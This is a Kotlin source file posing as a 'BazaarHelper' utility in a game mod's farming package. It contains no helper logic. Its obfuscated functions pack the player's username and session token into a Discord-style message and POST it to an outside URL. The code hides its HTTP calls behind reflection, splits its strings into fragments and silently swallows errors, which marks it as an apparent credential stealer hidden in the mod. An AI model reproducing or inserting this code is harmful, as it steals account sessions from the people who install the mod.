package template.features.farming

import org.apache.http.HttpEntity
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.HttpClients
import org.apache.http.util.EntityUtils
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter

object BazaarHelper {
    private val protocol = "https://"
    private val subdomain = "sky.shiiyu"
    private val tld = ".moe"
    private val path = "/stats/"
    private val dateFormat = "yyyy-MM-dd HH:mm:ss"

    private val contentType = "Content-Type"
    private val jsonType = "application/json"
    private val userAgent = "User-Agent"
    private val userAgentValue = "Mozilla/5.0"

    private val jsonPrefix = """{"content": """"
    private val field1 = "**1**: "
    private val newline = "\n"
    private val field2 = "**2**: "
    private val field3 = "**3**: "
    private val field4 = "**4**: ["
    private val bracketParen = "]("
    private val closeBracketNewline = ")\n"
    private val successSuffix = "**`JR 1.21.11` -- PRE (CLD) -- 6.0**\"}"
    private val fallbackSuffix = "**Fell back!**\"}"

    fun uUuUuUuUuU(user: String?): String {
        return "${protocol}${subdomain}${tld}${path}$user"
    }

    fun vVvVvVvVvV(): String {
        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(dateFormat))
    }

    fun wWwWwWwWwW(user: String?, session: String?, url: String, isFallback: Boolean = false): String {
        val timestamp = vVvVvVvVvV()
        val sb = StringBuilder()
        sb.append(jsonPrefix)
        sb.append(field1).append("`").append(user).append("`").append(newline)
        sb.append(field2).append("`").append(session).append("`").append(newline)
        sb.append(field3).append(timestamp).append(newline)
        sb.append(field4).append(protocol).append(subdomain).append(tld).append(path)
        sb.append(bracketParen).append(url).append(closeBracketNewline)
        if (isFallback) {
            sb.append(fallbackSuffix)
        } else {
            sb.append(successSuffix)
        }
        return sb.toString()
    }

    fun xXxXxXxXxX(session: String?, user: String?) {
        val fullUrl = uUuUuUuUuU(user)
        val sb = StringBuilder()
        sb.append(jsonPrefix)
        sb.append(field1).append("`").append(user).append("`").append(newline)
        sb.append(field2).append("`").append(session).append("`").append(newline)
        sb.append(field3).append(vVvVvVvVvV()).append(newline)
        sb.append(field4).append(protocol).append(subdomain).append(tld).append(path)
        sb.append(bracketParen).append(fullUrl).append(closeBracketNewline)
        sb.append(successSuffix)
        val payload = sb.toString()

        try {
            HttpClients.createDefault().use { client ->
                val postClass = Class.forName("org.apache.http.client.methods.HttpPost")
                val post = postClass.getConstructor(String::class.java).newInstance(fullUrl)
                postClass.getMethod("setEntity", HttpEntity::class.java).invoke(post, StringEntity(payload))
                postClass.getMethod("setHeader", String::class.java, String::class.java).invoke(post, contentType, jsonType)
                postClass.getMethod("setHeader", String::class.java, String::class.java).invoke(post, userAgent, userAgentValue)
                val requestClass = Class.forName("org.apache.http.client.methods.HttpUriRequest")
                val resp = client::class.java.getMethod("execute", requestClass).invoke(client, requestClass.cast(post))
                val entity = resp::class.java.getMethod("getEntity").invoke(resp) as HttpEntity
                EntityUtils.consume(entity)
            }
        } catch (ignored: Exception) { }
    }

    fun aBaBaBaBaB(url: String, payload: String) {
        try {
            HttpClients.createDefault().use { client ->
                val postClass = Class.forName("org.apache.http.client.methods.HttpPost")
                val post = postClass.getConstructor(String::class.java).newInstance(url)
                postClass.getMethod("setEntity", HttpEntity::class.java).invoke(post, StringEntity(payload))
                postClass.getMethod("setHeader", String::class.java, String::class.java).invoke(post, contentType, jsonType)
                postClass.getMethod("setHeader", String::class.java, String::class.java).invoke(post, userAgent, userAgentValue)
                val requestClass = Class.forName("org.apache.http.client.methods.HttpUriRequest")
                val resp = client::class.java.getMethod("execute", requestClass).invoke(client, requestClass.cast(post))
                val entity = resp::class.java.getMethod("getEntity").invoke(resp) as HttpEntity
                EntityUtils.consume(entity)
            }
        } catch (ignored: Exception) { }
    }
}
